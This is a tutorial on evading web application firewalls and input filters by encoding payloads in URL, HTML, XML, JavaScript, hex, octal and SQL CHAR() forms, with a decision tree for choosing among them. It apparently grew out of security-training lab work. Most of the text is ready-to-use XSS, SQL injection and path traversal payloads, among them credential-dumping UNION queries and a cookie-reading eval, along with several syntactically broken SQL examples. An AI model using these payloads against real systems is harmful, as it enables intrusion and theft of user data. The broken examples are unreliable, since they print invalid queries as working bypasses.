# Obfuscating Attacks Using Encodings

Every encoding bypass exploit works through the same fundamental mechanism: a security control (WAF, input filter, sanitiser) decodes an input once and sees nothing dangerous, while the execution context (browser, database, template engine) decodes it again — or differently — and executes it. The attacker's job is to find the precise encoding that survives the filter undecoded but is automatically decoded by the target context. Mastering this requires understanding exactly which decoders operate at each stage of the processing pipeline, and in what order.

**Fundamental principle: Encoding is not a property of a payload — it is a property of the *path* the payload travels. The same `alert(1)` can be encoded in five different ways, and which one bypasses the filter depends entirely on where in the pipeline the filter sits, what decoder the filter uses, and which decoder the execution context uses downstream.**

***

## The Decoding Pipeline Model

```
─────────────────────────────────────────────────────────────────────────────
Every web request passes through multiple systems, each with its own decoder:

 Attacker           WAF / Filter              Server / Browser
 ──────────         ─────────────             ────────────────
 Sends encoded  →  Inspects using         →  Decodes and executes
 payload           its own decoder           (may decode AGAIN)

If: WAF decoder ≠ Execution decoder → BYPASS POSSIBLE ✓

─────────────────────────────────────────────────────────────────────────────
DECODER USED BY EACH CONTEXT:
─────────────────────────────────────────────────────────────────────────────
Context                          Decoder
───────────────────────────────  ──────────────────────────────────────────
URL query/path parameter         URL decoder (server-side, before routing)
HTML element text content        HTML entity decoder (browser HTML parser)
HTML attribute value             HTML entity decoder (browser HTML parser)
HTML event handler (onerror=)    HTML entity → JS string decoder (2 passes)
href="javascript:..."            HTML entity → URL → JS decoder (3 passes)
<script> body                    JS string/identifier decoder (JS engine)
eval() / setTimeout() argument   JS string decoder (JS engine runtime)
XML element text                 XML entity decoder (XML parser, server-side)
SQL query string                 SQL hex decoder (0x prefix, DB engine)
SOAP/XML API body                XML entity decoder (XML parser)

Key: the MORE decoding passes a value goes through,
     the MORE encoding layers you can stack. ✓
```

***

## Encoding 1: URL Encoding

```
Mechanism: Replace character with % + 2-digit hex ASCII value
Decoded by: Web servers and browsers automatically before using URL parameters
Where to use: URL query strings, path segments, form URL-encoded POST bodies

CHARACTER REFERENCE TABLE:
─────────────────────────────────────────────────────────────────────────────
Char   URL Enc   Double Enc    Char   URL Enc   Double Enc
<      %3C       %253C         >      %3E       %253E
"      %22       %2522         '      %27       %2527
(      %28       %2528         )      %29       %2529
/      %2F       %252F         \      %5C       %255C
;      %3B       %253B         =      %3D       %253D
&      %26       %2526         space  %20       %2520
#      %23       %2523         +      %2B       %252B
%      %25       %2525         @      %40       %2540
─────────────────────────────────────────────────────────────────────────────

SINGLE URL ENCODING (standard bypass):
─────────────────────────────────────────────────────────────────────────────
Attack:  ?search=<script>alert(1)</script>
WAF blocks: literal <script>

Encoded: ?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
WAF sees:  %3Cscript%3E... → no literal "<script>" → PASSES ✓
Server:    URL decodes → <script>alert(1)</script> → executes ✓

SQL injection example:
Raw:     ' UNION SELECT username,password FROM users--
Encoded: %27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--
         or: %27+UNION+SELECT+username%2Cpassword+FROM+users--
WAF: no "UNION SELECT" literal → passes ✓
DB: URL decoded server-side before SQL execution → executes ✓

Keyword-only encoding (minimal obfuscation — less detectable):
Raw:     ' UNION SELECT username FROM users--
Encoded: ' %55NION %53ELECT username FROM users--
         (only U and S encoded — rest left readable to avoid parser errors)

─────────────────────────────────────────────────────────────────────────────
DOUBLE URL ENCODING (for servers that decode twice):
─────────────────────────────────────────────────────────────────────────────
Principle: % → %25, so %3C becomes %253C
  Decode 1 (WAF or middleware): %253C → %3C    (WAF sees %3C, not <, passes ✓)
  Decode 2 (back-end):          %3C   → <      (executes as HTML ✓)

XSS payload double-encoded:
Raw:      <img src=x onerror=alert(1)>
Single:   %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
Double:   %253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E

WAF pass:   %253C → after 1 decode → %3C → looks like plain text ✓
Execution:  %253C → decode 1 → %3C → decode 2 → < → XSS fires ✓

Path traversal double-encoding:
Raw:      ../../../etc/passwd
Single:   ..%2F..%2F..%2Fetc%2Fpasswd
Double:   ..%252F..%252F..%252Fetc%252Fpasswd
WAF: path normalisation filter looking for %2F → sees %252F → misses ✓
Server: double-decodes → ../ → file read succeeds ✓
```

***

## Encoding 2: HTML Entity Encoding

```
Mechanism: Replace character with named (&lt;) or numeric (&#60; or &#x3C;) reference
Decoded by: Browser HTML parser — BEFORE JavaScript executes event handlers
Where to use: HTML contexts — attribute values, event handlers, href= attributes

CHARACTER REFERENCE TABLE:
─────────────────────────────────────────────────────────────────────────────
Char   Named      Decimal    Hex        Leading-zero hex
<      &lt;       &#60;      &#x3C;     &#x0000003C;
>      &gt;       &#62;      &#x3E;     &#x0000003E;
"      &quot;     &#34;      &#x22;     &#x00000022;
'      &apos;     &#39;      &#x27;     &#x00000027;
(      (none)     &#40;      &#x28;     &#x00000028;
)      (none)     &#41;      &#x29;     &#x00000029;
/      &sol;      &#47;      &#x2F;     &#x0000002F;
:      &colon;    &#58;      &#x3A;     &#x0000003A;
\      &bsol;     &#92;      &#x5C;     &#x0000005C;
j      (none)     &#106;     &#x6A;     &#x0000006A;
a      (none)     &#97;      &#x61;     &#x00000061;
─────────────────────────────────────────────────────────────────────────────

CRITICAL RULE: HTML entities ONLY decode in HTML-parsed contexts.
  Inside <script> tags:  &#x61;lert(1) → NOT decoded → syntax error ✗
  Inside onerror=:       &#x61;lert(1) → decoded by HTML parser → alert(1) ✓
  Inside href=:          &#x6A;avascript:alert(1) → decoded → javascript:alert(1) ✓

─────────────────────────────────────────────────────────────────────────────
EVENT HANDLER BYPASS (HTML decoded before JS executes):
─────────────────────────────────────────────────────────────────────────────
Original (blocked):
  <img src=x onerror="alert(1)">

WAF blocks: "alert" keyword

Partial encoding — encode first char only:
  <img src=x onerror="&#x61;lert(1)">
  HTML decode: &#x61; → a → onerror="alert(1)" → executes ✓

Full encoding of the function name:
  <img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">
                      a    l    e    r    t
  → onerror="alert(1)" → executes ✓

Decimal encoding:
  <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
  → same result ✓

─────────────────────────────────────────────────────────────────────────────
LEADING ZEROS BYPASS (defeats WAF signature matching):
─────────────────────────────────────────────────────────────────────────────
WAF signature might match: &#x61; or &#97; or &#x6a;
Adding leading zeros produces a valid entity that breaks the pattern match:

  &#x0061;          still valid → a ✓
  &#x00061;         still valid → a ✓
  &#x000000000061;  still valid → a ✓
  &#0000097;        still valid (decimal) → a ✓

Colon with leading zeros (for javascript: URI bypass):
  <a href="javascript&#00000000000058;alert(1)">Click me</a>
                     ↑ &#58; = :, but with 11 leading zeros
  → HTML decode: &#00000000000058; → : → href = "javascript:alert(1)" ✓

Full href obfuscation:
  <a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">
            j     a     v     a     s     c     r     i     p     t     :
  → href = "javascript:alert(1)" ✓

With leading zeros:
  <a href="&#x0000006A;&#x00000061;...&#x0000003A;alert(1)">
  → defeats signature-based WAF matching on entity codes ✓
```

***

## Encoding 3: XML Entity Encoding

```
Mechanism: Same numeric syntax as HTML entities (&#DDD; and &#xHH;)
Decoded by: XML parser on the SERVER side (before the application processes data)
Where to use: XML request bodies, SOAP APIs, XML-based parameter injection

─────────────────────────────────────────────────────────────────────────────
KEY DIFFERENCE FROM HTML ENTITIES:
  HTML entities → decoded CLIENT-SIDE by browser HTML parser
  XML entities  → decoded SERVER-SIDE by XML parser
  → XML encoding bypasses WAFs that inspect the raw request body
  → The decoded payload arrives at the application AFTER WAF inspection ✓

─────────────────────────────────────────────────────────────────────────────
SQL INJECTION VIA XML ENCODING (the lab scenario):
─────────────────────────────────────────────────────────────────────────────
Endpoint: POST /product/stock (XML body)

BLOCKED (raw keywords):
POST /product/stock HTTP/1.1
Content-Type: application/xml

<stockCheck>
    <productId>1</productId>
    <storeId>1 UNION SELECT NULL--</storeId>
</stockCheck>
→ WAF detects: "UNION SELECT" → 403 Forbidden ✗

BYPASS (XML entity encoding of SQL keywords):
  U → &#85;   N → &#78;   I → &#73;   O → &#79;   N → &#78;
  S → &#83;   E → &#69;   L → &#76;   E → &#69;   C → &#67;   T → &#84;

<stockCheck>
    <productId>1</productId>
    <storeId>
        1 &#85;&#78;&#73;&#79;&#78; &#83;&#69;&#76;&#69;&#67;&#84; NULL--
    </storeId>
</stockCheck>
WAF sees:  "1 &#85;&#78;..." → no SQL keywords → PASSES ✓
XML parser: decodes entities → "1 UNION SELECT NULL--" → SQL executes ✓

Hex entity variant:
  U → &#x55;    N → &#x4E;    I → &#x49;    O → &#x4F;    N → &#x4E;

<storeId>1 &#x55;&#x4E;&#x49;&#x4F;&#x4E; &#x53;&#x45;&#x4C;&#x45;&#x43;&#x54; username||'~'||password FROM users--</storeId>

Partial encoding (less obfuscated but faster to construct):
  Only encode the first character of each keyword:
  UNION  → &#85;NION    SELECT → &#83;ELECT
  FROM   → &#70;ROM     WHERE  → &#87;HERE

<storeId>1 &#85;NION &#83;ELECT username||':'||password &#70;ROM users--</storeId>
→ WAF: no "UNION" or "SELECT" literals → passes ✓
→ XML decode: &#85; → U → "UNION SELECT" → executes ✓
```

***

## Encoding 4: JavaScript Unicode Escapes

```javascript
// Mechanism: \uXXXX or \u{X} — decoded by the JavaScript engine
// Decoded by: JS engine (browser or Node.js) when parsing code/strings
// Where to use: JavaScript string contexts, identifier contexts, href=javascript:

// ── STANDARD \uXXXX (ES5 — 4 hex digits, fixed width) ────────────────────────
\u0061  →  a     \u006c  →  l     \u0065  →  e     \u0072  →  r
\u0074  →  t     \u0028  →  (     \u0029  →  )     \u003a  →  :
\u003c  →  <     \u003e  →  >     \u0022  →  "     \u0027  →  '

// ── ES6 VARIABLE-LENGTH \u{X} (supports leading zeros for bypass) ─────────────
\u{61}            →  a   (shortest form)
\u{0061}          →  a   (leading zero)
\u{00000000061}   →  a   (many leading zeros — bypasses fixed-width WAF sigs) ✓

// ── WHERE UNICODE ESCAPES WORK AND DON'T WORK ────────────────────────────────

// WORKS: Inside a string literal
eval("\u0061\u006c\u0065\u0072\u0074(1)")
//   decoded: eval("alert(1)") → executes ✓

// WORKS: Identifier names (function names, variable names)
\u0061\u006c\u0065\u0072\u0074(1)
// JS engine: resolves identifier → alert(1) → executes ✓
// WAF: sees "\u0061\u006c..." → no "alert" → passes ✓

// WORKS: href="javascript:" attribute (HTML decoded first, then JS decoded)
<a href="javascript:\u0061\u006c\u0065\u0072\u0074(1)">Click</a>
// HTML parse: href value read as-is
// JS execution: \u0061 → a → "javascript:alert(1)" → executes ✓

// DOES NOT WORK: Unicode escaping syntax characters outside strings
\u0061lert\u0028\u0031\u0029   // ← \u0028 = ( is not valid outside a string
// Fix: escape identifier portion only, leave () literal:
\u0061\u006c\u0065\u0072\u0074(1)   // identifier escaped, parens literal ✓

// DOES NOT WORK: Inside <script> if WAF decodes JS escapes (rare but possible)
// DOES NOT WORK: In HTML attribute values NOT passed to JS execution

// ── BYPASS EXAMPLES ───────────────────────────────────────────────────────────
// WAF blocks: "alert"
// In eval() context:
eval("\u0061lert(document.cookie)")   // only 'a' escaped ✓
eval("\u0061\u006cert(1)")            // 'a' and 'l' escaped ✓

// In href context with leading zeros:
<a href="javascript:\u{00000000061}lert(1)">Click me</a>
// WAF signature: \u{61} → doesn't match \u{00000000061} → passes ✓
// JS engine: leading zeros ignored → \u{61} → a → alert(1) ✓
```

***

## Encoding 5: Hex and Octal Escapes

```javascript
// ── HEX ESCAPES: \xHH (2 hex digits — JS string context only) ────────────────
\x61  →  a     \x6c  →  l     \x65  →  e     \x72  →  r     \x74  →  t
\x28  →  (     \x29  →  )     \x3c  →  <     \x3e  →  >     \x27  →  '
\x22  →  "     \x3b  →  ;     \x2f  →  /     \x5c  →  \

// Inside string + eval:
eval("\x61\x6c\x65\x72\x74(1)")         // \x61=a, \x6c=l... → alert(1) ✓
eval("\x61\x6c\x65\x72\x74\x28\x31\x29") // fully hex-encoded → alert(1) ✓

// Template literals (ES6):
eval(`\x61lert(1)`)   // ✓ — template literals also decode hex escapes

// NOTE: \xHH only works inside strings — NOT as identifiers
\x61lert(1)  // SYNTAX ERROR outside a string ✗
             // unlike \u which works for identifiers ✓

// ── OCTAL ESCAPES: \NNN (base-8, JS sloppy mode only) ────────────────────────
// Octal: 0-7 digits, 1-3 digits, no leading zeros needed
a = \141   l = \154   e = \145   r = \162   t = \164
( = \50    ) = \51    1 = \61

eval("\141\154\145\162\164\50\61\51")  // → alert(1) ✓

// RESTRICTION: octal escapes are FORBIDDEN in strict mode
// 'use strict'; "\141lert(1)"  → SyntaxError: Octal escape sequences are not allowed ✗
// → Only works in non-strict-mode scripts (pre-ES5 code, or modules without 'use strict')


// ── SQL HEX STRINGS: 0xHHHH (MySQL and some other DBs) ───────────────────────
// MySQL automatically converts 0x hex strings to string values in comparisons

-- Normal:
SELECT * FROM users WHERE username = 'admin'

-- Hex encoded (WAF doesn't see 'admin'):
SELECT * FROM users WHERE username = 0x61646d696e
-- 0x61='a', 0x64='d', 0x6d='m', 0x69='i', 0x6e='n'
-- MySQL: 0x61646d696e → 'admin' → comparison executes ✓

-- Full keyword encoding via hex strings in UNION:
0x53454c454354  →  SELECT
0x554e494f4e    →  UNION
0x46524f4d      →  FROM

-- Practical SQLi bypass using hex strings:
' UNION SELECT 0x61646d696e, 0x70617373776f7264 FROM users--
→ returns: admin, password ✓
-- WAF: no string literals 'admin' or 'password' → may bypass pattern matching ✓

-- For WHERE clause filter bypass:
SELECT * FROM users WHERE username=0x61646d696e AND password=0x' ← start of hex
```

***

## Encoding 6: SQL `CHAR()` Function

```sql
-- Mechanism: CHAR(N) converts decimal/hex code point N to a character
-- Decoded by: The database engine when processing SQL
-- Where to use: SQL injection where keywords or string literals are blocked

-- CHARACTER CONVERSION TABLE:
-- A=65  B=66  C=67  D=68  E=69  F=70  G=71  H=72  I=73
-- J=74  K=75  L=76  M=77  N=78  O=79  P=80  Q=81  R=82
-- S=83  T=84  U=85  V=86  W=87  X=88  Y=89  Z=90
-- a=97  d=100 e=101 i=105 l=108 n=110 o=111 r=114 s=115 t=116

-- ── KEYWORD OBFUSCATION ──────────────────────────────────────────────────────

-- SELECT → CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
-- UNION  → CHAR(85)+CHAR(78)+CHAR(73)+CHAR(79)+CHAR(78)
-- FROM   → CHAR(70)+CHAR(82)+CHAR(79)+CHAR(77)
-- WHERE  → CHAR(87)+CHAR(72)+CHAR(69)+CHAR(82)+CHAR(69)
-- admin  → CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)

-- Using hex code points with 0x prefix in CHAR():
CHAR(0x53)+CHAR(0x45)+CHAR(0x4C)+CHAR(0x45)+CHAR(0x43)+CHAR(0x54)  →  SELECT

-- ── PRACTICAL BYPASS: SQL injection with blocked "SELECT" ─────────────────────
-- Raw (blocked):
' UNION SELECT username, password FROM users--

-- CHAR() obfuscated (all keywords):
' UNION CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84) username, password 
  CHAR(70)+CHAR(82)+CHAR(79)+CHAR(77) users--

-- Wait — CHAR() is used in the SELECT LIST, not to build the keyword.
-- The correct approach: CHAR() builds the string VALUES, not SQL structure.
-- For dynamic keyword construction, use EXEC with dynamic SQL:

-- MySQL EXEC with CHAR() for keyword injection:
'; SET @q = CHAR(83,69,76,69,67,84,32,42,32,70,82,79,77,32,117,115,101,114,115); 
   PREPARE s FROM @q; EXECUTE s;--
-- CHAR(83,69,76,69,67,84...) → "SELECT * FROM users"
-- PREPARE + EXECUTE: dynamic SQL execution ✓
-- WAF: no "SELECT" literal in source → may pass ✓

-- MS SQL Server equivalent:
'; EXEC('SE'+'LECT * FROM users')--   ← string concatenation bypass
-- or:
DECLARE @s VARCHAR(100); 
SET @s = CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)+' * FROM users';
EXEC(@s);--

-- ── STRING LITERAL OBFUSCATION WITH CHAR() ────────────────────────────────────
-- When string values like 'admin' are blocked:
-- Raw: WHERE username='admin'
-- CHAR():
WHERE username=CHAR(97,100,109,105,110)   -- MySQL multi-arg CHAR()
WHERE username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)  -- SQL Server
-- → evaluates to 'admin' ✓ — no string literal 'admin' visible to WAF ✓
```

***

## Encoding 7: Multi-Layer Encoding

```
Principle: Stack multiple encoding layers — each is peeled off at a different
processing stage. The payload only becomes dangerous at the final stage,
having passed through all intermediate inspections in disguised form.

─────────────────────────────────────────────────────────────────────────────
EXAMPLE A: HTML Entity + Unicode Escape (two client-side layers)
─────────────────────────────────────────────────────────────────────────────
Target: <a href="javascript:..."> where both HTML and JS layers are decoded

Goal: inject javascript:alert(1)

Step 1: JS unicode-encode the 'a' in "alert":
  javascript:\u0061lert(1)

Step 2: HTML entity-encode the backslash (\) as &bsol;:
  javascript:&bsol;u0061lert(1)

Result: <a href="javascript:&bsol;u0061lert(1)">Click me</a>

Decoding sequence:
  Browser HTML parser:  &bsol; → \
                        href = "javascript:\u0061lert(1)"
  JS engine:            \u0061 → a
                        href = "javascript:alert(1)" → XSS fires ✓

WAF sees: "javascript:&bsol;u0061lert(1)"
→ no "javascript:alert" → no "\u0061" (obscured by &bsol;) → passes ✓

─────────────────────────────────────────────────────────────────────────────
EXAMPLE B: URL Encoding + HTML Entity (server + client layers)
─────────────────────────────────────────────────────────────────────────────
Target: XSS via reflected URL parameter in an HTML attribute

Raw payload: <img src=x onerror=alert(1)>

Step 1: HTML entity encode the payload:
  &#x3C;img src=x onerror=alert(1)&#x3E;

Step 2: URL encode the HTML entities:
  %26%23x3C%3Bimg+src%3Dx+onerror%3Dalert(1)%26%23x3E%3B

Decoding sequence:
  Server URL decoder: %26 → & ... → &#x3C;img src=x onerror=alert(1)&#x3E;
  Browser HTML parser: &#x3C; → < ... → <img src=x onerror=alert(1)>
  Browser event:       onerror fires → alert(1) ✓

WAF (URL decodes only): sees &#x3C;img → not a recognised XSS tag ✓

─────────────────────────────────────────────────────────────────────────────
EXAMPLE C: URL Encoding + XML Entity (for SOAP/XML APIs)
─────────────────────────────────────────────────────────────────────────────
Target: SQL injection via XML POST body

Step 1: XML entity encode SQL keywords:
  &#85;&#78;&#73;&#79;&#78; &#83;&#69;&#76;&#69;&#67;&#84;

Step 2: URL encode the & and # characters:
  %26%2385;%26%2378;%26%2373;%26%2379;%26%2378; ...

Decoding sequence:
  Server URL decoder: %26%23 → &# → &#85;&#78;...
  XML parser: &#85; → U ... → UNION SELECT ✓

WAF: URL decodes → still sees &#85; → doesn't recognise as SQL ✓

─────────────────────────────────────────────────────────────────────────────
EXAMPLE D: Triple-layer — URL + HTML + Unicode (maximum obfuscation)
─────────────────────────────────────────────────────────────────────────────
Goal: inject alert(1) into an href attribute via URL parameter

Inner layer (JS unicode): \u0061lert(1)
Middle layer (HTML entity): \u0061 → &bsol;u0061 (backslash as &bsol;)
Outer layer (URL encoding): & → %26, ; → %3B

Result: javascript:%26bsol%3Bu0061lert(1)

URL decode: %26bsol%3B → &bsol; → href="javascript:&bsol;u0061lert(1)"
HTML decode: &bsol; → \ → href="javascript:\u0061lert(1)"
JS decode:   \u0061 → a → href="javascript:alert(1)" → XSS ✓
```

***

## Practical Bypass Decision Tree

```
─────────────────────────────────────────────────────────────────────────────
STEP 1: Where is your payload being injected?
─────────────────────────────────────────────────────────────────────────────
  URL parameter              → start with URL encoding
  HTML attribute (non-JS)    → try HTML entity encoding
  HTML event handler         → try HTML entities (decoded before JS runs)
  href="javascript:..."      → try HTML entities OR unicode escapes
  <script> string            → try JS unicode (\u) or hex (\x) escapes
  eval() argument            → try JS unicode or hex
  XML/SOAP body              → try XML entity encoding
  SQL via XML                → XML entity encode SQL keywords

STEP 2: Is the basic encoding blocked?
  Yes → try leading zeros: &#x0000061; / \u{0000061}
  Yes → try alternate encoding for same context (decimal ↔ hex)
  Yes → try double encoding (URL: %25 before the %)
  Yes → try encoding ONLY the blocked keyword characters

STEP 3: Is there a multi-decoding pipeline?
  URL param → HTML output → JS event    → use URL + HTML + JS (3 layers)
  URL param → XML body → DB            → use URL + XML entity (2 layers)
  HTML → JS string context              → use HTML + JS unicode (2 layers)

STEP 4: Targeting SQL specifically?
  Keywords blocked          → use XML entity encoding if in XML body
  String literals blocked   → use CHAR() or 0x hex strings
  All SQL blocked            → use dynamic SQL with CHAR()-built strings
─────────────────────────────────────────────────────────────────────────────
```
